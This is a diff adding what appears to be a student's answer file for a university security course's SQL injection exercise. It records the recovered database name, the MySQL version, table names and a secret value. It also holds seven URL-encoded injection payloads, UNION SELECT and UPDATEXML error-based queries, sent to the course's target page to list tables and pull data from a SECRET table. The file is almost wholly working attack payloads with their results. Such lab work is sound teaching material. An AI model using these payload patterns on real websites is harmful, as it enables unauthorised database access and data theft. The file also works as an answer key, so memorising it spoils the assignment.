@@ -1,0 +1,12 @@
+proj2_inject3
+5.5.50-0ubuntu0.14.04.1
+HINT,SECRET,foo,inject3_users
+foxtrot
+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27%20and%200%20UNION%20SELECT%201,(SELECT%20database()),3,4--%20-
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27%20and%200%20UNION%20SELECT%201,(SELECT%20version()),3,4--%20-
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27%20and%20UPDATEXML(NULL,concat(0x3a,%20(SELECT%20table_name%20from%20information_schema.tables%20WHERE%20table_schema=database()%20limit%200,1)%20),NULL)--%20-
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27%20and%20UPDATEXML%28NULL,concat%280x3a,%20%28SELECT%20table_name%20from%20information_schema.tables%20WHERE%20table_schema=database%28%29%20limit%201,1%29%20%29,NULL%29--%20-
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27%20and%20UPDATEXML%28NULL,concat%280x3a,%20%28SELECT%20table_name%20from%20information_schema.tables%20WHERE%20table_schema=database%28%29%20limit%202,1%29%20%29,NULL%29--%20-
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27%20and%20UPDATEXML%28NULL,concat%280x3a,%20%28SELECT%20table_name%20from%20information_schema.tables%20WHERE%20table_schema=database%28%29%20limit%203,1%29%20%29,NULL%29--%20-
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27%20and%20UPDATEXML(NULL,concat(0x3a,%20(select%20concat(secret)%20from%20SECRET%20limit%200,1)%20),NULL)--%20-
